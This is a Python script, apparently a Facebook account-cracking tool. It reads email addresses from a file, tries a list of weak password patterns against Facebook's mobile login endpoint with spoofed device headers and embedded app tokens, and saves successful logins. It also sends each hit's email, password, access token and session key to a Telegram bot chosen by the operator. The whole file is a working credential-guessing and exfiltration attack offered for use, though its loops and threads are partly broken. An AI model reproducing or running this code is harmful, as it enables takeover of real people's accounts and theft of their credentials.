import random
import requests
from user_agent import generate_user_agent
import time
import uuid
import threading
from threading import Thread
tt = str(time.time()).split('.')[0]
print("""
\033[92m        .-.
\033[92m       .'   `.          ------------------------------\033[92m--
\033[92m       :g g   :                                
\033[92m       : o    `.                         
\033[33m      :         ``.     ------------------------------\033[33m--
\033[33m     :             `.
\033[33m    :  :         .   `.
\033[33m    :   :          ` . `.
\033[34m     `.. :            `. ``;
\033[34m        `:;             `:'
\033[34m           :              `.
\033[34m            `.              `.     .
\033[34m              `'`'`'`---.......`;.-'
\033[95m                *****AHMED*****

──────────────────────────────────────────────────
""")
token=str(input("Enter Token • "))
id=int(input("Enter ld • "))
gf,bf,hc=0, 0 ,0

def login(email, pw):
    global gf,bf,hc
    device_id = str(uuid.uuid4());family_device_id = str(uuid.uuid4());secure_family_device_id = str(uuid.uuid4());adid = str(uuid.uuid4())
    current_timestamp = int(time.time())
    pwd_enc = f"#PWD_FB4A:0:{current_timestamp}:{pw}"
    url = "https://b-graph.facebook.com/auth/login"
    payload = {
    "adid": adid,
    "format": "json",
    "device_id": device_id,
    "email": email,
    "password": pw,
    "generate_analytics_claim": "1",
    "community_id": "",
    "cpl": "true",
    "try_num": "1",
    "family_device_id": family_device_id,
    "secure_family_device_id": secure_family_device_id,
    "credentials_type": "password",
    "generate_session_cookies": "1",
    "error_detail_type": "button_with_disabled",
    "source": "login",
    "generate_machine_id": "1",
    "currently_logged_in_userid": "0",
    "locale": "ar_AR",
    "client_country_code": "EG",
    "fb_api_req_friendly_name": "authenticate",
    "fb_api_caller_class": "Fb4aAuthHandler",
    "api_key": "882a8490361da98702bf97a021ddc14d",
    "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
}
    
    headers = {
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; RMX3263 Build/RP1A.201005.001) [FBAN/FB4A;FBAV/450.0.0.45.109;FBPN/com.facebook.katana;FBLC/ar_EG;FBBV/987654321;FBCR/WE;FBMF/realme;FBBD/realme;FBDV/RMX3263;FBSV/11;FBCA/arm64-v8a:;FBDM/{density=2.0,width=720,height=1600};]",
    "Accept-Encoding": "gzip, deflate",
    "x-fb-connection-quality": "EXCELLENT",
    "x-fb-friendly-name": "authenticate",
    "x-fb-http-engine": "Liger",
    "x-fb-client-ip": "True",
    "x-fb-server-cluster": "True",
    "authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
}
    response = requests.post(url, headers=headers, data=payload).json()
    
    if 'www.facebook.com' in response:
    		hc+=1
    		print(f"Hits • {gf} | Secuer • {hc} | Bad f • {bf} | {email}:{pw}")
    		ff=f'''
======== faecbook=========
Email > {email}
Password > {pw}
Programmer > @I249I
channel > @p249p
======== faecbook=========
    	'''
    		requests.post(f"https://api.telegram.org/bot{token}/sendMessage",
    		params={"chat_id": id, "text": ff})
    		with open("Secuer.txt","a") as f:
    			f.write(f"{email}"+":"+f"{pw}"+"\n")
    elif "session_key" in response:
    	gf+=1
    	print(f"Hits • {gf} | Secuer • {hc} | Bad f • {bf} | {email}:{pw}")
    	sess=response["session_key"]
    	axx=response["access_token"]
    	ff=f'''
========Hits faecbook=========
Email > {email}
Password > {pw}
Access_token > {axx}
Session_key > {sess}
Programmer > @I249I
channel > @p249p
========Hits faecbook=========
    	'''
    	
    	requests.post(f"https://api.telegram.org/bot{token}/sendMessage",
    	params={"chat_id": id, "text": ff})
    	with open("Secuer.txt","a") as f:
    			f.write(f"{email}"+":"+f"{pw}"+"\n")
    	
    else:
    	bf+=1
    	print(f"Hits • {gf} | Secuer • {hc} | Bad f • {bf} | {email}:{pw}")
    	
    	
    
    	


passwordlest = [
'firstfirst',
'first last',
'first first',
'firstlast',
'first123',
'first1234',
'first12345',
'first123456',
'first12345678',
'first 12',
'first 123',
'first 1234',
'first 12345',
'first 123456',
'first 12345678',
'lastlast',
'last last',
'last123',
'last1234',
'last12345',
'last123456',
'last12345678',
'firstfirst123',
'20262026',
					
]

with open("id.txt", "r", encoding="utf-8") as file:
    emails = file.readlines()


for email in emails:
    email = email.strip()

    
    
for pw in passwordlest:
	login(email,pw)
	
	
for i in range(30):
	Thread(target=login).start()